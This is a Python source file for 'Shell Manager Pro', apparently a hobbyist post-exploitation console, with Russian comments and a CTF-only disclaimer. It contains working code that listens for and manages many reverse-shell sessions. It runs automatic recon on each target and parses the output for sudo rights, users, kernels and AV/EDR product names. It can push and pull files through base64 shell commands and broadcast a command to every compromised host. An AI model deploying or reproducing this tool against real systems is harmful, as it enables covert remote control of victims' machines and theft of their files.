"""
Shell Manager Pro — приём и управление reverse-shell сессиями.
Author: idqwixxa

⚠ Только для этичного использования и CTF / лабораторий.

Возможности:
    ─── Listener ───
    - Multi-session TCP listener (default 0.0.0.0:4444)
    - Auto-reconnect (persistent listener)
    - Host allowlist (только доверенные IP)

    ─── Session ───
    - Labels + tags
    - Autorecon при подключении (опционально)
    - Авто-разбор вывода (users / hostname / IPs / sudo / SUID / creds)
    - Asciinema-запись + raw dump
    - File upload/download (base64)
    - Broadcast команды всем сессиям

    ─── REPL ───
    - Metasploit-style use/background/read/send
    - Quick-shortcuts (25+)
    - Search в истории
    - Session info / findings

    ─── Интеграция ───
    - Findings → notes (active session, captured artifacts)
    - Notify при подключении
    - Экспорт: JSON / HTML / Markdown / CSV
"""
import base64
import csv
import html as html_mod
import json
import os
import re
import socket
import threading
import time
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Any

from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt, IntPrompt, Confirm

from core.config import REPORT_DIR
from core.database import db
from core.logger import get_logger

console = Console()
log = get_logger(__name__)

SHELL_DIR = REPORT_DIR / "shells"
SHELL_DIR.mkdir(parents=True, exist_ok=True)

DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 4444


# ===========================================================================
# Findings integration
# ===========================================================================

@dataclass
class ShellFinding:
    kind: str
    severity: str
    title: str
    target: str = ""
    evidence: str = ""
    data: dict = field(default_factory=dict)


def _save_finding(f: ShellFinding) -> int:
    if f.severity not in ("critical", "high"):
        return -1
    try:
        from modules import notes
        return notes.add_note(
            kind="finding",
            title=f.title,
            target=f.target,
            severity=f.severity,
            status="open",
            tags=["shell", f.kind],
            body=(f"**Kind:** {f.kind}\n"
                  f"**Target:** {f.target}\n\n"
                  f"**Evidence:**\n```\n{(f.evidence or '—')[:1500]}\n```\n\n"
                  f"**Data:** `{json.dumps(f.data, ensure_ascii=False, default=str)[:1000]}`"),
        )
    except Exception:
        return -1


# ===========================================================================
# Auto-recon
# ===========================================================================

AUTORECON_CMDS = [
    "id",
    "whoami",
    "hostname",
    "pwd",
    "uname -a",
    "cat /etc/os-release 2>/dev/null | head -5",
    "ip a 2>/dev/null || ifconfig 2>/dev/null",
    "netstat -an 2>/dev/null | head -5",
    "ps aux 2>/dev/null | head -10",
]


# ===========================================================================
# Session
# ===========================================================================

class ShellSession:
    """Одно подключение reverse-shell."""

    def __init__(self, sid: int, addr, sock: socket.socket,
                 log_dir: Path,
                 autorecon: bool = False) -> None:
        self.sid = sid
        self.addr = addr
        self.sock = sock
        self.label = ""
        self.tags: set[str] = set()
        self.connected_at = datetime.now()
        self.last_activity = datetime.now()
        self._buffer = bytearray()
        self.commands_log: list[tuple[datetime, str]] = []
        self.alive = True
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self.autorecon = autorecon
        self.findings: dict[str, Any] = {
            "users": set(),
            "hostname": "",
            "ips": set(),
            "sudo_rights": [],
            "suid": [],
            "creds": [],
            "av": [],
        }

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_path = log_dir / f"shell_session_{sid}_{ts}.log"
        self.asciinema_path = log_dir / f"shell_session_{sid}_{ts}.cast"
        self.raw_path = log_dir / f"shell_session_{sid}_{ts}.raw"

        self._log_handle = None
        self._asciinema_handle = None
        self._raw_handle = None
        self._start_time = time.time()

    # ------------------------------------------------------------------
    # Reader
    # ------------------------------------------------------------------

    def start_reader(self) -> None:
        try:
            self._log_handle = self.log_path.open("ab", buffering=0)
            self._asciinema_handle = self.asciinema_path.open("w",
                                                               encoding="utf-8")
            self._raw_handle = self.raw_path.open("wb")
        except Exception:
            pass
        # asciinema header
        try:
            if self._asciinema_handle:
                self._asciinema_handle.write(json.dumps({
                    "version": 2, "width": 120, "height": 40,
                    "timestamp": int(time.time()),
                    "env": {"SHELL": "/bin/sh", "TERM": "xterm-256color"},
                    "title": f"session {self.sid} — {self.addr[0]}:{self.addr[1]}",
                }) + "\n")
                self._asciinema_handle.flush()
        except Exception:
            pass

        t = threading.Thread(target=self._reader_loop, daemon=True,
                             name=f"shell-{self.sid}-reader")
        t.start()

        if self.autorecon:
            threading.Thread(target=self._run_autorecon, daemon=True,
                             name=f"shell-{self.sid}-autorecon").start()

    def _reader_loop(self) -> None:
        try:
            self.sock.settimeout(1.0)
        except Exception:
            pass
        while not self._stop.is_set():
            try:
                data = self.sock.recv(4096)
            except socket.timeout:
                continue
            except OSError:
                break
            if not data:
                break
            with self._lock:
                self._buffer.extend(data)
                self.last_activity = datetime.now()
            if self._log_handle:
                try:
                    self._log_handle.write(data)
                    self._log_handle.write(b"\n")
                except Exception:
                    pass
            if self._raw_handle:
                try:
                    self._raw_handle.write(data)
                    self._raw_handle.flush()
                except Exception:
                    pass
            if self._asciinema_handle:
                try:
                    elapsed = time.time() - self._start_time
                    text = data.decode("utf-8", errors="replace")
                    self._asciinema_handle.write(json.dumps(
                        [round(elapsed, 3), "o", text]) + "\n")
                    self._asciinema_handle.flush()
                except Exception:
                    pass
            # Авто-разбор
            try:
                self._parse_output(data.decode("utf-8", errors="replace"))
            except Exception:
                pass
        self.alive = False

    def _parse_output(self, text: str) -> None:
        """Авто-разбор интересных данных из вывода."""
        for m in re.finditer(r"uid=\d+\((\w+)\)", text):
            self.findings["users"].add(m.group(1))
        for m in re.finditer(r"\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}"
                              r"(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b", text):
            ip = m.group()
            if ip not in ("0.0.0.0", "127.0.0.1"):
                self.findings["ips"].add(ip)
        for m in re.finditer(r"\(ALL\)\s+NOPASSWD:\s*(\S+)", text):
            self.findings["sudo_rights"].append(m.group(1))
        for m in re.finditer(r"Linux\s+\S+\s+([\d.]+)", text):
            self.findings.setdefault("kernels", set()).add(m.group(1))
        for kw in ("defender", "crowdstrike", "sentinelone", "carbonblack",
                   "cylance", "sophos", "kaspersky", "mcafee"):
            if kw in text.lower():
                self.findings["av"].append(kw)

    def _run_autorecon(self) -> None:
        time.sleep(1.5)
        try:
            for cmd in AUTORECON_CMDS:
                self.send(cmd)
                time.sleep(1.2)
        except Exception as exc:
            log.debug("autorecon: %s", exc)

    # ------------------------------------------------------------------
    # Отправка / чтение
    # ------------------------------------------------------------------

    def send(self, cmd: str) -> None:
        with self._lock:
            if not self.alive:
                raise RuntimeError("session dead")
            try:
                self.sock.sendall((cmd + "\n").encode("utf-8",
                                                      errors="replace"))
            except OSError as exc:
                self.alive = False
                raise RuntimeError(f"send failed: {exc}")
            self.commands_log.append((datetime.now(), cmd))
            self.last_activity = datetime.now()

    def read_output(self) -> str:
        with self._lock:
            data = bytes(self._buffer)
            self._buffer.clear()
        return data.decode("utf-8", errors="replace")

    def peek_output(self) -> str:
        with self._lock:
            return bytes(self._buffer).decode("utf-8", errors="replace")

    # ------------------------------------------------------------------
    # File transfer
    # ------------------------------------------------------------------

    def upload_b64(self, local_path: str,
                    remote_path: str = "/tmp/f") -> bool:
        p = Path(local_path)
        if not p.exists():
            return False
        try:
            b64 = base64.b64encode(p.read_bytes()).decode()
            self.send(f"echo '{b64}' | base64 -d > {remote_path}")
            time.sleep(1.5)
            return True
        except Exception as exc:
            log.warning("upload: %s", exc)
            return False

    def download_b64(self, remote_path: str,
                     local_path: str | None = None) -> bool:
        if not local_path:
            local_path = str(SHELL_DIR / f"sess{self.sid}_" +
                              Path(remote_path).name)
        try:
            self.send(f"base64 -w0 {remote_path} 2>/dev/null")
            time.sleep(2.0)
            output = self.read_output()
            b64_lines = [ln.strip() for ln in output.splitlines()
                         if ln.strip() and re.match(
                             r"^[A-Za-z0-9+/=]{40,}$", ln.strip())]
            if not b64_lines:
                return False
            b64 = max(b64_lines, key=len)
            b64 += "=" * (-len(b64) % 4)
            Path(local_path).write_bytes(base64.b64decode(b64))
            console.print(f"[green]✓ Скачано: {local_path} "
                          f"({Path(local_path).stat().st_size} B)[/green]")
            return True
        except Exception as exc:
            log.warning("download: %s", exc)
            return False

    # ------------------------------------------------------------------
    # Close
    # ------------------------------------------------------------------

    def close(self) -> None:
        self._stop.set()
        try:
            self.sock.close()
        except Exception:
            pass
        for h in (self._log_handle, self._asciinema_handle,
                   self._raw_handle):
            try:
                if h:
                    h.close()
            except Exception:
                pass
        self.alive = False


# ===========================================================================
# Server
# ===========================================================================

class ShellServer:
    """TCP-листенер с множеством сессий."""

    def __init__(self, host: str = DEFAULT_HOST, port: int = DEFAULT_PORT,
                 log_dir: Path | None = None,
                 autorecon: bool = False,
                 allow_ips: list[str] | None = None) -> None:
        self.host = host
        self.port = port
        self.log_dir = log_dir or SHELL_DIR
        self.autorecon = autorecon
        self.allow_ips = allow_ips or []
        self.sessions: dict[int, ShellSession] = {}
        self._next_id = 1
        self._stop = threading.Event()
        self._server_sock: socket.socket | None = None
        self._accept_thread: threading.Thread | None = None
        self._lock = threading.Lock()

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------

    def start(self) -> None:
        self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_sock.bind((self.host, self.port))
        self._server_sock.listen(16)
        self._stop.clear()
        self._accept_thread = threading.Thread(
            target=self._accept_loop, daemon=True, name="shell-accept",
        )
        self._accept_thread.start()
        console.print(
            f"[green]✓ Shell listener: {self.host}:{self.port}[/green]")
        console.print(f"[dim]Логи: {self.log_dir}[/dim]")
        if self.autorecon:
            console.print("[cyan]  Autorecon: включен[/cyan]")
        if self.allow_ips:
            console.print(f"[cyan]  Allowlist: {', '.join(self.allow_ips)}"
                          f"[/cyan]")

    def _accept_loop(self) -> None:
        try:
            self._server_sock.settimeout(1.0)
        except Exception:
            return
        while not self._stop.is_set():
            try:
                client, addr = self._server_sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break

            ip = addr[0]
            if self.allow_ips and ip not in self.allow_ips:
                console.print(f"[yellow]✗ Reject {ip} (not in allowlist)"
                              f"[/yellow]")
                try:
                    client.close()
                except Exception:
                    pass
                continue

            with self._lock:
                sid = self._next_id
                self._next_id += 1

            sess = ShellSession(sid, addr, client, self.log_dir,
                                 autorecon=self.autorecon)
            sess.start_reader()
            with self._lock:
                self.sessions[sid] = sess

            console.print(
                f"\n[bold green]● Новый shell #{sid} от "
                f"{addr[0]}:{addr[1]}[/bold green]")
            try:
                db.save_scan("shell", f"{addr[0]}:{addr[1]}",
                             {"session_id": sid})
            except Exception:
                pass

            # Notify
            try:
                from modules import notifier
                notifier.notify_all(
                    f"🐚 New shell #{sid}",
                    f"From: {addr[0]}:{addr[1]}\n"
                    f"Autorecon: {'on' if self.autorecon else 'off'}",
                    severity="high",
                )
            except Exception:
                pass

    def stop(self) -> None:
        self._stop.set()
        if self._server_sock:
            try:
                self._server_sock.close()
            except Exception:
                pass
        with self._lock:
            for sess in self.sessions.values():
                sess.close()

    # ------------------------------------------------------------------
    # Управление
    # ------------------------------------------------------------------

    def list_sessions(self) -> list[ShellSession]:
        with self._lock:
            return list(self.sessions.values())

    def get(self, sid: int) -> ShellSession | None:
        with self._lock:
            return self.sessions.get(sid)

    def remove(self, sid: int) -> bool:
        with self._lock:
            sess = self.sessions.pop(sid, None)
        if sess:
            sess.close()
            return True
        return False

    def broadcast(self, cmd: str) -> int:
        """Отправить команду всем живым сессиям."""
        sent = 0
        for s in self.list_sessions():
            if not s.alive:
                continue
            try:
                s.send(cmd)
                sent += 1
            except Exception:
                continue
        return sent

    @property
    def running(self) -> bool:
        return (self._accept_thread is not None
                and self._accept_thread.is_alive())


# ===========================================================================
# Global instance (для TUI)
# ===========================================================================

_server: ShellServer | None = None


def get_server() -> ShellServer | None:
    return _server


def quick_start(host: str = DEFAULT_HOST,
                port: int = DEFAULT_PORT) -> bool:
    global _server
    if _server and _server.running:
        console.print("[yellow]Shell listener уже запущен.[/yellow]")
        return True
    try:
        srv = ShellServer(host=host, port=port)
        srv.start()
        _server = srv
        return True
    except Exception as exc:
        console.print(f"[red]Ошибка запуска listener: {exc}[/red]")
        return False


def quick_stop() -> None:
    global _server
    if not _server:
        console.print("[yellow]Listener не запущен.[/yellow]")
        return
    _server.stop()
    _server = None
    console.print("[yellow]Shell listener остановлен.[/yellow]")


def quick_list() -> None:
    if not _server:
        console.print("[yellow]Listener не запущен.[/yellow]")
        return
    sessions = _server.list_sessions()
    if not sessions:
        console.print("[yellow]Активных сессий нет.[/yellow]")
        return
    _print_sessions_table(sessions)


def quick_status() -> None:
    running = _server is not None and _server.running
    table = Table(title="🐚 Shell Manager")
    table.add_column("Параметр", style="cyan")
    table.add_column("Значение", style="green")
    table.add_row("Запущен", "✓" if running else "—")
    if running and _server:
        table.add_row("Адрес", f"{_server.host}:{_server.port}")
        table.add_row("Сессий", str(len(_server.sessions)))
        table.add_row("Autorecon",
                      "✓" if _server.autorecon else "—")
        table.add_row("Логи", str(_server.log_dir))
    console.print(table)


# ===========================================================================
# Printing
# ===========================================================================

def _print_sessions_table(sessions: list[ShellSession]) -> None:
    table = Table(title=f"🐚 Сессии ({len(sessions)})")
    table.add_column("ID", style="cyan", width=5)
    table.add_column("Label", style="yellow", max_width=14)
    table.add_column("Адрес", style="green", width=18)
    table.add_column("Uptime", style="white", width=10)
    table.add_column("Idle", style="yellow", width=10)
    table.add_column("Cmds", width=5)
    table.add_column("Tags", style="dim", max_width=15)
    table.add_column("Статус", style="red")
    now = datetime.now()
    for s in sessions:
        uptime = str(now - s.connected_at).split(".")[0]
        idle = str(now - s.last_activity).split(".")[0]
        status = "🟢 alive" if s.alive else "⚪ closed"
        table.add_row(
            f"#{s.sid}",
            (s.label or "—")[:14],
            f"{s.addr[0]}:{s.addr[1]}",
            uptime,
            idle,
            str(len(s.commands_log)),
            ",".join(list(s.tags)[:3]) or "—",
            status,
        )
    console.print(table)


def _print_findings(s: ShellSession) -> None:
    t = Table(title=f"🔎 Findings — session #{s.sid}")
    t.add_column("Категория", style="cyan", width=14)
    t.add_column("Значения", style="green", max_width=80)
    f = s.findings
    if f.get("users"):
        t.add_row("Users", ", ".join(sorted(f["users"])[:20]))
    if f.get("hostname"):
        t.add_row("Hostname", str(f["hostname"]))
    if f.get("ips"):
        t.add_row("IPs", ", ".join(sorted(f["ips"])[:20]))
    if f.get("sudo_rights"):
        t.add_row("Sudo", ", ".join(f["sudo_rights"][:10]))
    if f.get("suid"):
        t.add_row("SUID", ", ".join(f["suid"][:10]))
    if f.get("kernels"):
        t.add_row("Kernels", ", ".join(sorted(f["kernels"])))
    if f.get("av"):
        t.add_row("AV/EDR", ", ".join(set(f["av"])))
    console.print(t)


# ===========================================================================
# Export sessions
# ===========================================================================

def export_sessions(sessions: list[ShellSession], fmt: str = "json",
                    out_path: str | None = None) -> Path | None:
    if not sessions:
        console.print("[yellow]Нет сессий.[/yellow]")
        return None
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    ext = {"json": ".json", "md": ".md", "html": ".html",
           "csv": ".csv"}.get(fmt, ".json")
    if not out_path:
        out_path = str(SHELL_DIR / f"sessions_{ts}{ext}")
    p = Path(out_path)

    def _ser(s: ShellSession) -> dict:
        return {
            "sid": s.sid,
            "label": s.label,
            "tags": sorted(s.tags),
            "addr": f"{s.addr[0]}:{s.addr[1]}",
            "connected_at": s.connected_at.isoformat(),
            "last_activity": s.last_activity.isoformat(),
            "alive": s.alive,
            "commands_count": len(s.commands_log),
            "log_path": str(s.log_path),
            "asciinema_path": str(s.asciinema_path),
            "findings": {
                "users": sorted(s.findings.get("users") or []),
                "hostname": s.findings.get("hostname", ""),
                "ips": sorted(s.findings.get("ips") or []),
                "sudo_rights": s.findings.get("sudo_rights") or [],
                "suid": s.findings.get("suid") or [],
                "kernels": sorted(s.findings.get("kernels") or []),
                "av": sorted(set(s.findings.get("av") or [])),
            },
        }

    try:
        if fmt == "json":
            p.write_text(
                json.dumps([_ser(s) for s in sessions],
                            indent=2, ensure_ascii=False, default=str),
                encoding="utf-8")
        elif fmt == "md":
            lines = [
                "# Shell sessions",
                f"_Generated: {datetime.now().isoformat()}_", "",
                f"Total: **{len(sessions)}**", "",
                "| ID | Label | Addr | Uptime | Cmds | Tags | Users |",
                "|----|-------|------|--------|------|------|-------|",
            ]
            now = datetime.now()
            for s in sessions:
                uptime = str(now - s.connected_at).split(".")[0]
                users = ", ".join(sorted(s.findings.get("users") or [])[:5])
                lines.append(
                    f"| #{s.sid} | {s.label or '—'} | "
                    f"{s.addr[0]}:{s.addr[1]} | {uptime} | "
                    f"{len(s.commands_log)} | "
                    f"{','.join(list(s.tags)[:3]) or '—'} | {users} |")
            p.write_text("\n".join(lines), encoding="utf-8")
        elif fmt == "csv":
            with p.open("w", newline="", encoding="utf-8") as fp:
                w = csv.writer(fp)
                w.writerow(["sid", "label", "addr", "alive", "commands",
                            "tags", "users", "ips", "log", "cast"])
                for s in sessions:
                    w.writerow([
                        s.sid, s.label, f"{s.addr[0]}:{s.addr[1]}",
                        "1" if s.alive else "0",
                        len(s.commands_log),
                        ",".join(sorted(s.tags)),
                        ",".join(sorted(s.findings.get("users") or [])),
                        ",".join(sorted(s.findings.get("ips") or [])),
                        str(s.log_path), str(s.asciinema_path),
                    ])
        elif fmt == "html":
            parts = [
                "<!DOCTYPE html><html lang='ru'><head>"
                "<meta charset='utf-8'>",
                "<title>Shell sessions</title>",
                "<style>",
                "body{background:#0a0a0a;color:#c8c8c8;font-family:monospace;"
                "padding:24px;line-height:1.5;max-width:1300px;"
                "margin:0 auto;}",
                "h1{color:#00ff9c;border-bottom:2px solid #00ff9c;}",
                "table{width:100%;border-collapse:collapse;margin-top:12px;"
                "font-size:13px;}",
                "th{background:#111;color:#00ff9c;padding:6px;"
                "text-align:left;border:1px solid #222;}",
                "td{padding:4px 6px;border:1px solid #222;"
                "word-break:break-all;}",
                "tr:nth-child(even){background:#0d0d0d;}",
                ".alive{color:#00ff9c;}.dead{color:#888;}",
                "</style></head><body>",
                f"<h1>🐚 Shell sessions ({len(sessions)})</h1>",
                f"<p>Generated: "
                f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>",
                "<table><tr><th>ID</th><th>Label</th><th>Addr</th>"
                "<th>Uptime</th><th>Cmds</th><th>Users</th>"
                "<th>Hostname</th><th>IPs</th></tr>",
            ]
            now = datetime.now()
            for s in sessions:
                uptime = str(now - s.connected_at).split(".")[0]
                cls = "alive" if s.alive else "dead"
                users = ", ".join(sorted(s.findings.get("users") or [])[:10])
                ips = ", ".join(sorted(s.findings.get("ips") or [])[:6])
                parts.append(
                    f"<tr><td class='{cls}'>#{s.sid}</td>"
                    f"<td>{html_mod.escape(s.label or '—')}</td>"
                    f"<td>{html_mod.escape(f'{s.addr[0]}:{s.addr[1]}')}</td>"
                    f"<td>{html_mod.escape(uptime)}</td>"
                    f"<td>{len(s.commands_log)}</td>"
                    f"<td>{html_mod.escape(users)}</td>"
                    f"<td>{html_mod.escape(str(s.findings.get('hostname') or ''))}</td>"
                    f"<td>{html_mod.escape(ips)}</td></tr>")
            parts.append("</table></body></html>")
            p.write_text("\n".join(parts), encoding="utf-8")
        console.print(f"[green]✓ {fmt.upper()}: {p}[/green]")
        return p
    except Exception as exc:
        console.print(f"[red]Ошибка экспорта: {exc}[/red]")
        return None


# ===========================================================================
# REPL
# ===========================================================================

HELP_TEXT = """
[bold cyan]🐚 Shell Manager Pro — команды:[/bold cyan]

  [green]sessions[/green] / [green]ls[/green]        — список сессий
  [green]use <id>[/green]              — переключиться на сессию
  [green]read <id>[/green]             — прочитать накопленный вывод
  [green]peek <id>[/green]             — посмотреть без очистки буфера
  [green]send <id> <команда>[/green]   — отправить команду
  [green]broadcast <команда>[/green]   — ВСЕМ сессиям
  [green]label <id> <текст>[/green]    — пометить сессию
  [green]tag <id> <tag>[/green]        — добавить тег
  [green]findings <id>[/green]         — авто-артефакты сессии
  [green]note <id>[/green]             — сохранить в notes как finding
  [green]upload <id> <local> [remote][/green]  — загрузить файл на цель
  [green]download <id> <remote> [local][/green] — скачать файл с цели
  [green]kill <id>[/green] / [green]kill-all[/green]
  [green]logs <id>[/green]             — путь к логу
  [green]cast <id>[/green]             — путь к asciinema
  [green]info <id>[/green]             — детальная информация
  [green]export <json|html|md|csv>[/green]
  [green]clear[/green]                 — очистить экран
  [green]help[/green] / [green]exit[/green]

[bold cyan]Внутри сессии (после [green]use <id>[/green]):[/bold cyan]
  любой ввод → команда для шелла
  [green]read[/green] / [green]peek[/green] / [green]info[/green]
  [green]findings[/green]              — авто-артефакты
  [green]background[/green] / Ctrl+C    — вернуться в меню
"""


def _print_banner() -> None:
    console.print("[bold cyan]╔══ CyberSec Shell Manager Pro ══╗[/bold cyan]")
    console.print("[magenta]by idqwixxa[/magenta]")
    console.print("[yellow]⚠ Только для этичного использования и CTF"
                  "[/yellow]")
    console.print("[dim]Команды: help[/dim]\n")


def repl(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT,
         autorecon: bool = False,
         allow_ips: list[str] | None = None) -> None:
    """Интерактивный REPL с листенером."""
    global _server

    srv = ShellServer(host=host, port=port,
                      autorecon=autorecon, allow_ips=allow_ips)
    try:
        srv.start()
    except Exception as exc:
        console.print(f"[red]Не могу запустить листенер: {exc}[/red]")
        return
    _server = srv

    _print_banner()
    current_sid: int | None = None

    def _sessions_list() -> None:
        sessions = srv.list_sessions()
        if not sessions:
            console.print("[yellow]Активных сессий нет.[/yellow]")
            return
        _print_sessions_table(sessions)

    def _read_output(sid: int, peek: bool = False) -> None:
        s = srv.get(sid)
        if not s:
            console.print(f"[red]#{sid} не найдена.[/red]")
            return
        text = s.peek_output() if peek else s.read_output()
        if not text:
            console.print("[dim](пусто)[/dim]")
        else:
            console.print(text, end="" if text.endswith("\n") else "\n")
            if not text.endswith("\n"):
                console.print()

    def _kill(sid: int) -> None:
        if srv.remove(sid):
            console.print(f"[green]✓ Сессия #{sid} закрыта.[/green]")
        else:
            console.print(f"[red]#{sid} не найдена.[/red]")

    def _info(sid: int) -> None:
        s = srv.get(sid)
        if not s:
            console.print(f"[red]#{sid} не найдена.[/red]")
            return
        table = Table(title=f"🐚 Session #{sid}")
        table.add_column("Поле", style="cyan")
        table.add_column("Значение", style="green")
        table.add_row("ID", str(s.sid))
        table.add_row("Label", s.label or "—")
        table.add_row("Tags", ", ".join(sorted(s.tags)) or "—")
        table.add_row("Addr", f"{s.addr[0]}:{s.addr[1]}")
        table.add_row("Connected",
                      s.connected_at.strftime("%Y-%m-%d %H:%M:%S"))
        table.add_row("Last activity",
                      s.last_activity.strftime("%Y-%m-%d %H:%M:%S"))
        table.add_row("Alive", "✓" if s.alive else "—")
        table.add_row("Commands sent", str(len(s.commands_log)))
        table.add_row("Log file", str(s.log_path))
        table.add_row("Asciinema", str(s.asciinema_path))
        console.print(table)
        if s.commands_log:
            console.print("\n[cyan]Последние команды:[/cyan]")
            for ts, cmd in s.commands_log[-10:]:
                console.print(f"  [dim]{ts.strftime('%H:%M:%S')}[/dim] "
                              f"[green]{cmd}[/green]")

    try:
        while True:
            try:
                line = input(
                    f"session {current_sid}> "
                    if current_sid is not None else "shell> "
                ).strip()
            except (EOFError, KeyboardInterrupt):
                console.print()
                if current_sid is not None:
                    current_sid = None
                    console.print("[dim]Возврат в главное меню.[/dim]")
                    continue
                break

            if not line:
                continue

            # ── Внутри сессии ──
            if current_sid is not None:
                low = line.lower()
                if low in ("background", "bg", "back", "exit-session"):
                    current_sid = None
                    console.print("[dim]Возврат в главное меню.[/dim]")
                    continue
                if low == "read":
                    _read_output(current_sid)
                    continue
                if low == "peek":
                    _read_output(current_sid, peek=True)
                    continue
                if low == "info":
                    _info(current_sid)
                    continue
                if low == "findings":
                    s = srv.get(current_sid)
                    if s:
                        _print_findings(s)
                    continue
                if low == "help":
                    console.print(HELP_TEXT)
                    continue
                s = srv.get(current_sid)
                if not s:
                    console.print(f"[red]#{current_sid} потеряна.[/red]")
                    current_sid = None
                    continue
                try:
                    s.send(line)
                    console.print("[dim]→ sent[/dim]")
                    time.sleep(0.5)
                    _read_output(current_sid)
                except Exception as exc:
                    console.print(f"[red]Ошибка: {exc}[/red]")
                continue

            # ── Главное меню ──
            parts = line.split(None, 1)
            cmd = parts[0].lower()
            arg = parts[1].strip() if len(parts) > 1 else ""

            if cmd in ("exit", "quit", "q"):
                break
            if cmd == "help" or cmd == "?":
                console.print(HELP_TEXT)
                continue
            if cmd == "sessions" or cmd == "list" or cmd == "ls":
                _sessions_list()
                continue
            if cmd == "use":
                if not arg.isdigit():
                    console.print("[red]use <id>[/red]")
                    continue
                sid = int(arg)
                s = srv.get(sid)
                if not s:
                    console.print(f"[red]#{sid} не найдена.[/red]")
                    continue
                current_sid = sid
                console.print(f"[green]→ session {sid} "
                              f"({s.addr[0]}:{s.addr[1]})[/green]")
                continue
            if cmd == "read":
                if not arg.isdigit():
                    console.print("[red]read <id>[/red]")
                    continue
                _read_output(int(arg))
                continue
            if cmd == "peek":
                if not arg.isdigit():
                    console.print("[red]peek <id>[/red]")
                    continue
                _read_output(int(arg), peek=True)
                continue
            if cmd == "send":
                sp = arg.split(None, 1)
                if len(sp) < 2 or not sp[0].isdigit():
                    console.print("[red]send <id> <команда>[/red]")
                    continue
                sid = int(sp[0])
                s = srv.get(sid)
                if not s:
                    console.print(f"[red]#{sid} не найдена.[/red]")
                    continue
                try:
                    s.send(sp[1])
                    console.print("[dim]→ sent[/dim]")
                    time.sleep(0.5)
                    _read_output(sid)
                except Exception as exc:
                    console.print(f"[red]Ошибка: {exc}[/red]")
                continue
            if cmd == "broadcast":
                if not arg:
                    console.print("[red]broadcast <команда>[/red]")
                    continue
                n = srv.broadcast(arg)
                console.print(f"[green]✓ Отправлено {n} сессиям[/green]")
                continue
            if cmd == "label":
                sp = arg.split(None, 1)
                if len(sp) < 2 or not sp[0].isdigit():
                    console.print("[red]label <id> <текст>[/red]")
                    continue
                s = srv.get(int(sp[0]))
                if s:
                    s.label = sp[1][:40]
                    console.print(f"[green]✓ #{s.sid} → "
                                  f"'{s.label}'[/green]")
                continue
            if cmd == "tag":
                sp = arg.split(None, 1)
                if len(sp) < 2 or not sp[0].isdigit():
                    console.print("[red]tag <id> <tag>[/red]")
                    continue
                s = srv.get(int(sp[0]))
                if s:
                    s.tags.add(sp[1])
                    console.print(f"[green]✓ #{s.sid} tags: "
                                  f"{','.join(s.tags)}[/green]")
                continue
            if cmd == "findings":
                if not arg.isdigit():
                    console.print("[red]findings <id>[/red]")
                    continue
                s = srv.get(int(arg))
                if s:
                    _print_findings(s)
                continue
            if cmd == "note":
                if not arg.isdigit():
                    console.print("[red]note <id>[/red]")
                    continue
                s = srv.get(int(arg))
                if s:
                    _save_finding(ShellFinding(
                        kind="active_session",
                        severity="high",
                        title=f"Active shell session #{s.sid}",
                        target=f"{s.addr[0]}:{s.addr[1]}",
                        evidence=(f"Users: "
                                  f"{list(s.findings.get('users') or [])}\n"
                                  f"Hostname: {s.findings.get('hostname')}\n"
                                  f"IPs: {list(s.findings.get('ips') or [])}\n"
                                  f"Commands: {len(s.commands_log)}"),
                        data={"sid": s.sid,
                              "addr": f"{s.addr[0]}:{s.addr[1]}"},
                    ))
                    console.print(f"[green]✓ #{s.sid} → notes[/green]")
                continue
            if cmd == "upload":
                sp = arg.split()
                if len(sp) < 2 or not sp[0].isdigit():
                    console.print("[red]upload <id> <local> [remote]"
                                  "[/red]")
                    continue
                s = srv.get(int(sp[0]))
                if s:
                    remote = sp[2] if len(sp) > 2 else "/tmp/f"
                    if s.upload_b64(sp[1], remote):
                        console.print(f"[green]✓ Uploaded: {remote}"
                                      f"[/green]")
                continue
            if cmd == "download":
                sp = arg.split()
                if len(sp) < 2 or not sp[0].isdigit():
                    console.print("[red]download <id> <remote> [local]"
                                  "[/red]")
                    continue
                s = srv.get(int(sp[0]))
                if s:
                    local = sp[2] if len(sp) > 2 else None
                    s.download_b64(sp[1], local)
                continue
            if cmd == "kill":
                if not arg.isdigit():
                    console.print("[red]kill <id>[/red]")
                    continue
                _kill(int(arg))
                continue
            if cmd == "kill-all":
                if not Confirm.ask("Закрыть все сессии?", default=False):
                    continue
                for s in srv.list_sessions():
                    srv.remove(s.sid)
                console.print("[green]✓ Все сессии закрыты.[/green]")
                continue
            if cmd == "logs":
                if not arg.isdigit():
                    console.print("[red]logs <id>[/red]")
                    continue
                s = srv.get(int(arg))
                if s:
                    console.print(f"[cyan]{s.log_path}[/cyan]")
                else:
                    console.print(f"[red]#{arg} не найдена.[/red]")
                continue
            if cmd == "cast":
                if not arg.isdigit():
                    console.print("[red]cast <id>[/red]")
                    continue
                s = srv.get(int(arg))
                if s:
                    console.print(f"[cyan]{s.asciinema_path}[/cyan]")
                    console.print(f"[dim]Play: asciinema play "
                                  f"{s.asciinema_path}[/dim]")
                continue
            if cmd == "info":
                if not arg.isdigit():
                    console.print("[red]info <id>[/red]")
                    continue
                _info(int(arg))
                continue
            if cmd == "export":
                fmt = arg or "json"
                export_sessions(srv.list_sessions(), fmt=fmt)
                continue
            if cmd == "clear":
                os.system("cls" if os.name == "nt" else "clear")
                continue

            console.print(f"[red]Неизвестная команда: {cmd}[/red] "
                          f"(help для списка)")
    finally:
        srv.stop()
        _server = None
        console.print("[yellow]Листенер остановлен. Сессии закрыты."
                      "[/yellow]")


# ===========================================================================
# CLI
# ===========================================================================

def cli_status() -> None:
    quick_status()


def cli_list() -> None:
    quick_list()


def cli_start(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None:
    quick_start(host=host, port=port)
    console.print("[cyan]Листенер работает в фоне.[/cyan]")


def cli_stop() -> None:
    quick_stop()


